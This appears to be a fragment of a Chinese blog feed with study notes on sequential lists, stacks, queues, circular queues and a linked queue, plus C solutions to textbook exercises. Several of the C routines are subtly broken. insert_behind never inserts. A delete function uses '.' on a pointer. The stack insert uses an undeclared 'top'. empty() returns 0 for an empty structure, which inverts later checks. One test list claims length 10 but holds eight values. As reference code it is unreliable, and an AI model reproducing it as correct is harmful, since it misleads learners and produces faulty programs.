class="comment">//插入操作  队尾插入</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span> *<span class="title">insert</span><span class="params">(<span class="built_in">queue</span> *qu,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(qu-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">        qu-&gt;front = qu-&gt;rear = p;  <span class="comment">//当队列本身是 空 时</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        qu-&gt;rear-&gt;next = p;   <span class="comment">//队尾插入</span></span><br><span class="line">        qu-&gt;rear = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> qu;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除操作：队首删除</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span> *<span class="title">delete</span><span class="params">(<span class="built_in">queue</span> *qu)</span></span>&#123;</span><br><span class="line">    node *q;</span><br><span class="line">    <span class="keyword">if</span>(!qu-&gt;front)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;队列为空，无法插入！\n&quot;</span>); <span class="keyword">return</span> qu;&#125;</span><br><span class="line">    q = qu-&gt;front;</span><br><span class="line">    qu-&gt;front = q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">if</span>(qu-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">        qu-&gt;rear = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> qu;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;线性表的链式存储&quot;&gt;&lt;a href=&quot;#线性表的链式存储&quot; class=&quot;headerlink&quot; title=&quot;线性表的链式存储&quot;&gt;&lt;/a&gt;线性表的链式存储&lt;/h2&gt;&lt;p&gt;线性表的存储方式：顺序存储 、链式存储&lt;/p&gt;
&lt;p&gt;单链表  带</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="链式存储" scheme="https://xizhi-future.github.io/tags/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
  <entry>
    <title>顺序表、栈、队列</title>
    <link href="https://xizhi-future.github.io/2021/10/05/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E3%80%81%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97/"/>
    <id>https://xizhi-future.github.io/2021/10/05/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E3%80%81%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97/</id>
    <published>2021-10-05T11:16:19.000Z</published>
    <updated>2021-10-07T09:33:25.383Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h3><p>插入 删除 任意位置，特点：顺序存储</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype a[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;sequence_list;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(sequence_list *slt)</span></span>&#123;</span><br><span class="line">    slt-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在顺序表后部进行插入操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_behind</span><span class="params">(sequence_list *slt,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(slt-&gt;size == MAXSIZE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;顺序表是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        slt-&gt;a[slt-&gt;size]=x;</span><br><span class="line">        slt-&gt;size = slt-&gt;size+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(sequence_list slt)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(!slt.size) <span class="built_in">printf</span>(<span class="string">&quot;顺序表是空的！&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;slt.size;i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,slt.a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断空 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(sequence_list slt)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(slt.size==<span class="number">0</span>?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找 值为 x 的 结点位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_x</span><span class="params">(sequence_list slt,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(slt.a[i]!=x &amp;&amp; i&lt;slt.size) i++;    </span><br><span class="line">    <span class="keyword">return</span>(i&lt;slt.size?i:<span class="number">-1</span>);   </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//取得 第 i 位置的 值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_i</span><span class="params">(sequence_list slt,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span> || i&gt;slt.size)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;指定位置不存在！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(slt.a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//任意位置插入</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_medium</span><span class="params">(sequence_list *slt,<span class="keyword">int</span> position,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(slt-&gt;size == MAXSIZE) </span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;顺序表是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span>(position &lt; <span class="number">0</span> || position &gt; slt-&gt;size)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;指定插入位置不存在！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=slt-&gt;size;i&gt;position;i--)</span><br><span class="line">        slt-&gt;a[i] = slt-&gt;a[i<span class="number">-1</span>];</span><br><span class="line">        </span><br><span class="line">    slt-&gt;a[position] = x;</span><br><span class="line">    slt-&gt;size++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除 某位置 结点值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(sequence_list *slt,<span class="keyword">int</span> position)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(slt-&gt;size == <span class="number">0</span>)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;顺序表是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span>(position&lt;<span class="number">0</span> || position &gt; slt.size)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;指定删除位置不存在！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=position;i&lt;slt-&gt;size;i++)</span><br><span class="line">        slt-&gt;a[i] = slt-&gt;a[i+<span class="number">1</span>];</span><br><span class="line">    slt-&gt;size--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>先进后出</p><p>插入 删除 同一端进行，为 栈顶，另一端封住，为栈底</p><p>插入 删除 操作 称为 进栈 出栈</p><p>栈实现：顺序存储、链式存储</p><p>以顺序存储为例：栈底：a[0]    栈顶  top</p><p>设定 top 所指的位置 是 下一个将要插入结点的位置</p><p>栈为空 ：top=0    </p><p><img src="https://i.loli.net/2021/09/24/Gc5HIKai7MNz8lu.png" alt="image-20210924104929877"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype a[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">&#125;sequence_stack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(sequence_stack *st)</span></span>&#123;</span><br><span class="line">    st-&gt;top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断 是否 空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(sequence_stack st)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(st.top==<span class="number">0</span>?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//取得 栈顶结点值</span></span><br><span class="line"><span class="function">datatype <span class="title">get_top</span><span class="params">(sequence_stack st)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(empty(st))</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;栈是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> st.a[st.top<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//插入 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(sequence_stack *st,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(st-&gt;top == MAXSIZE)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;栈是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    st-&gt;a[top] = x;</span><br><span class="line">    st-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(sequence_stack *st)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(st-&gt;top == <span class="number">0</span>)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;栈是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    st-&gt;top--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/24/mPSWeVpM6cAxBv1.png" alt="image-20210924110444661"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//括号匹配</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>先进先出</p><p>特点：插入 删除 操作  分别在表的两端进行，</p><p>插入 即 队尾  ，  删除即 队首</p><p>front  队首结点在数组元素中的下标，  rear  队尾结点在数组中元素下标的 下一个位置，即 即将插入的结点 在数组中的下标</p><p>称之为  进队 和  出队</p><p><img src="https://i.loli.net/2021/09/24/26pOHtGlRmsoZFx.png" alt="image-20210924110810951"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype a[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> front;</span><br><span class="line">    <span class="keyword">int</span> rear;</span><br><span class="line">&#125;sequence_queue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(sequence_queue *sq)</span></span>&#123;</span><br><span class="line">    sq-&gt;front = sq-&gt;rear = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断是否是 空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(sequence_queue sq)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(sq.front==sq.rear?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(sequence_queue sq)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(empty(sq))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;顺序队列是空的！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">for</span>(i=sq.front;i&lt;sq.rear;i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,sq.a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//插入</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(sequence_queue *sq,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(sq-&gt;rear == MAXSIZE)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;顺序队列是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    sq-&gt;a[sq-&gt;rear] = x;</span><br><span class="line">    sq-&gt;rear = sq-&gt;rear+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(sequence_queue *sq)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sq-&gt;front == sq-&gt;rear)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;顺序队列是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    sq-&gt;front++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/24/iwbsYCzS2U6nmaH.png" alt="image-20210924111918226"></p><p><img src="https://i.loli.net/2021/09/24/sLF8rGWwAIhxQpH.png" alt="image-20210924112001725"></p><p>循环队列中  满与空  的条件均是  front==rear   出现问题</p><p>问题解决：满 的条件 (rear+1)%MAXSIZE=front</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//循环队列 插入 操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_c</span><span class="params">(sequence_queue *sq,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>((sq-&gt;rear+<span class="number">1</span>)%MAXSIZE == sq-&gt;front)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;循环队列是满的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    sq-&gt;a[sq-&gt;rear] = x;</span><br><span class="line">    sq-&gt;rear = (sq-&gt;rear+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环队列 删除 操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_c</span><span class="params">(sequence_queue *sq)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sq-&gt;front == sq-&gt;rear)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;循环队列是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    sq-&gt;front = (sq-&gt;front+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第二章-—-题目"><a href="#第二章-—-题目" class="headerlink" title="第二章 — 题目"></a>第二章 — 题目</h2><h4 id="1-设计一个算法，求顺序表中值为x的结点的个数。"><a href="#1-设计一个算法，求顺序表中值为x的结点的个数。" class="headerlink" title="1.设计一个算法，求顺序表中值为x的结点的个数。"></a>1.设计一个算法，求顺序表中值为x的结点的个数。</h4><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(sqlist L,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,sum =  <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.data[i] == x)&#123;</span><br><span class="line">            sum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(sqlist L,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,sum =  <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.data[i] == x)&#123;</span><br><span class="line">            sum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sqlist <span class="built_in">list</span> = &#123;&#123;<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>&#125;,<span class="number">10</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count = %d\n&quot;</span>,count(<span class="built_in">list</span>,<span class="number">5</span>)); <span class="comment">//查找值为5的元素个数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/15/ltsbQV9L75CmhO6.png" alt="image-20210915203225682"></p><h4 id="2-设计一个算法，将一个顺序表倒置。即，如果顺序表各个结点值存储在一维数组a中，倒置的结果是使得数组a中的a-0-等于原来的最后一个元素，a-1-等于原来的倒数第2个元素，…，a的最后一个元素等于原来的第一个元素。"><a href="#2-设计一个算法，将一个顺序表倒置。即，如果顺序表各个结点值存储在一维数组a中，倒置的结果是使得数组a中的a-0-等于原来的最后一个元素，a-1-等于原来的倒数第2个元素，…，a的最后一个元素等于原来的第一个元素。" class="headerlink" title="2.设计一个算法，将一个顺序表倒置。即，如果顺序表各个结点值存储在一维数组a中，倒置的结果是使得数组a中的a[0]等于原来的最后一个元素，a[1] 等于原来的倒数第2个元素，…，a的最后一个元素等于原来的第一个元素。"></a>2.设计一个算法，将一个顺序表倒置。即，如果顺序表各个结点值存储在一维数组a中，倒置的结果是使得数组a中的a[0]等于原来的最后一个元素，a[1] 等于原来的倒数第2个元素，…，a的最后一个元素等于原来的第一个元素。</h4><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(sqlist *L)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,t;</span><br><span class="line">    i = <span class="number">0</span>;<span class="comment">// 第一个元素位置</span></span><br><span class="line">    j = L-&gt;length - <span class="number">1</span>; <span class="comment">// 最后一个元素位置</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        t = L-&gt;data[i]; <span class="comment">// 将第一个元素存入 临时的 t 中 </span></span><br><span class="line">        L-&gt;data[i++] = L-&gt;data[j]; <span class="comment">// 把最后一个元素值赋给第一个元素的位置</span></span><br><span class="line">        L-&gt;data[j--] = t; <span class="comment">// 再把 存入 t 的第一个元素的值赋给</span></span><br><span class="line">        <span class="comment">// 注意：j-- 的意思：首先进行赋值然后再进行自减</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span 